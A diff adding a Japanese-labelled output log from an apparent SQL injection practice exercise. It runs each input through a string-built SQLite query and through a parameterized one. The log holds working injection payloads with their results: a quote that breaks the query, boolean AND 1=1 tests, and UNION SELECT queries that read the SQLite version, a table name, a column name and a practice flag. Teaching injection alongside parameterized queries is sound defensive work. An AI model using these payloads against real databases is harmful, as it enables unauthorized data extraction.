@@ -1,0 +1,56 @@
+
+[1] 入力: 'Travel Kit'
+[2] 脆弱なSQL: SELECT id,name FROM products WHERE name='Travel Kit'
+[3] 脆弱なSQLの結果: [(3, 'Travel Kit')]
+[4] パラメータ化して同じ入力を送信:
+    SQL: SELECT id,name FROM products WHERE name=?
+    結果: [(3, 'Travel Kit')]
+
+[1] 入力: "Travel Kit'"
+[2] 脆弱なSQL: SELECT id,name FROM products WHERE name='Travel Kit''
+[3] 脆弱なSQLのエラー: OperationalError unrecognized token: "'Travel Kit''"
+[4] パラメータ化して同じ入力を送信:
+    SQL: SELECT id,name FROM products WHERE name=?
+    結果: []
+
+[1] 入力: "Travel Kit' AND 1=1 --"
+[2] 脆弱なSQL: SELECT id,name FROM products WHERE name='Travel Kit' AND 1=1 --'
+[3] 脆弱なSQLの結果: [(3, 'Travel Kit')]
+[4] パラメータ化して同じ入力を送信:
+    SQL: SELECT id,name FROM products WHERE name=?
+    結果: []
+
+[1] 入力: "Travel Kit' AND 1=2 --"
+[2] 脆弱なSQL: SELECT id,name FROM products WHERE name='Travel Kit' AND 1=2 --'
+[3] 脆弱なSQLの結果: []
+[4] パラメータ化して同じ入力を送信:
+    SQL: SELECT id,name FROM products WHERE name=?
+    結果: []
+
+[1] 入力: "NoSuch' UNION SELECT NULL,sqlite_version() --"
+[2] 脆弱なSQL: SELECT id,name FROM products WHERE name='NoSuch' UNION SELECT NULL,sqlite_version() --'
+[3] 脆弱なSQLの結果: [(None, '3.46.1')]
+[4] パラメータ化して同じ入力を送信:
+    SQL: SELECT id,name FROM products WHERE name=?
+    結果: []
+
+[1] 入力: "NoSuch' UNION SELECT NULL,(SELECT name FROM sqlite_schema WHERE type='table' AND name='practice_records') --"
+[2] 脆弱なSQL: SELECT id,name FROM products WHERE name='NoSuch' UNION SELECT NULL,(SELECT name FROM sqlite_schema WHERE type='table' AND name='practice_records') --'
+[3] 脆弱なSQLの結果: [(None, 'practice_records')]
+[4] パラメータ化して同じ入力を送信:
+    SQL: SELECT id,name FROM products WHERE name=?
+    結果: []
+
+[1] 入力: "NoSuch' UNION SELECT NULL,(SELECT name FROM pragma_table_info('practice_records') ORDER BY cid LIMIT 1 OFFSET 1) --"
+[2] 脆弱なSQL: SELECT id,name FROM products WHERE name='NoSuch' UNION SELECT NULL,(SELECT name FROM pragma_table_info('practice_records') ORDER BY cid LIMIT 1 OFFSET 1) --'
+[3] 脆弱なSQLの結果: [(None, 'label')]
+[4] パラメータ化して同じ入力を送信:
+    SQL: SELECT id,name FROM products WHERE name=?
+    結果: []
+
+[1] 入力: "NoSuch' UNION SELECT NULL,(SELECT label FROM practice_records LIMIT 1) --"
+[2] 脆弱なSQL: SELECT id,name FROM products WHERE name='NoSuch' UNION SELECT NULL,(SELECT label FROM practice_records LIMIT 1) --'
+[3] 脆弱なSQLの結果: [(None, 'CTF{PRACTICE_ONLY}')]
+[4] パラメータ化して同じ入力を送信:
+    SQL: SELECT id,name FROM products WHERE name=?
+    結果: []
